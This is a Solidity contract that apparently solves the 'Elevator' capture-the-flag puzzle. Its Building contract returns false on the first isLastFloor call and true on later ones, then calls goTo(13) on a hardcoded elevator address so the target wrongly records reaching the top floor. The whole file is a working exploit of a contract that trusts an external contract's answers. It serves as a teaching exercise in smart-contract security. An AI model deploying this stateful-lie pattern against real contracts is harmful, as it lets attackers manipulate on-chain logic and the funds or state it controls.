//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    IElevator public elevator =
        IElevator(0x0E4f9628FC0aF7d7d1608Fe54F3cc57a0462eabC);
    bool public _switch;

    function isLastFloor(uint) public returns (bool) {
        if (!_switch) {
            _switch = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        elevator.goTo(13);
    }
}
